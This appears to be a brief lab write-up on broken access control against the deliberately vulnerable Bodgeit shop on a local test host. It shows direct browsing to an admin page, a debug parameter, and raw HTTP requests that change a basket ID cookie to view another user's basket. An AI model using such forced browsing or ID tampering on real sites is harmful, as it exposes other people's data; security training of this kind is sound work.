# A5 - Broken Access Control

## Bodgeit

### Hello admin

`http://owasp.local:8080/bodgeit/admin.jsp`

### Debug please

`http://owasp.local:8080/bodgeit/basket.jsp?debug=true`

### Not my basket

```
GET /bodgeit/basket.jsp HTTP/1.1
Host: owasp.local:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp.local:8080/bodgeit/basket.jsp
Cookie: JSESSIONID=02E607A00E74F587A15899DEB2332938; b_id=2; PHPSESSID=65a0knksrnnnt7k22tb1otjre0
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Moj kosik `Cookie: b_id=2;` ?


```
GET /bodgeit/basket.jsp HTTP/1.1
Host: owasp.local:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp.local:8080/bodgeit/basket.jsp
Cookie: JSESSIONID=02E607A00E74F587A15899DEB2332938; b_id=1; PHPSESSID=65a0knksrnnnt7k22tb1otjre0
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
